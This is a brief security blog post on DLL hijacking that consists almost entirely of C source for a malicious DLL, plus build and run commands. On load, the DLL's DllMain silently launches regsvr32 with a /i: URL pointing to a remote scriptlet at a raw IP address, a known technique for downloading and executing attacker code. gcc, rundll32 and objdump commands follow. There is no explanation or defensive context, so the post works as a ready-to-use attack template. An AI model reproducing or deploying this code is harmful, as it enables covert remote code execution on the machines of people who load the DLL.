---
author: XhstormR
categories:
- security
date: 2019-10-02T14:00:52+08:00
title: DLL 劫持
---

<!--more-->

Updated on 2019-10-02

```c
#include <windows.h>
#include <process.h>

void msg(HWND hwnd, HINSTANCE hinst, LPTSTR lpCmdLine, int nCmdShow) {
  if (strlen(lpCmdLine) != 0) {
    MessageBox(NULL, lpCmdLine, "Title", MB_OK);
  }
}

BOOL DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call) {
  case DLL_PROCESS_ATTACH:
    spawnlp(P_DETACH, "regsvr32.exe", "regsvr32.exe",
            "/s /u /i:http://47.98.135.65/main/main.xml scrobj.dll", NULL);
    break;
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}
```

```bash
gcc 123.c -o 123.dll -shared -s

rundll32 123.dll msg
```

```bash
objdump -x 123.dll
objdump -h -j .edata 123.dll
objdump -s -j .edata 123.dll
```
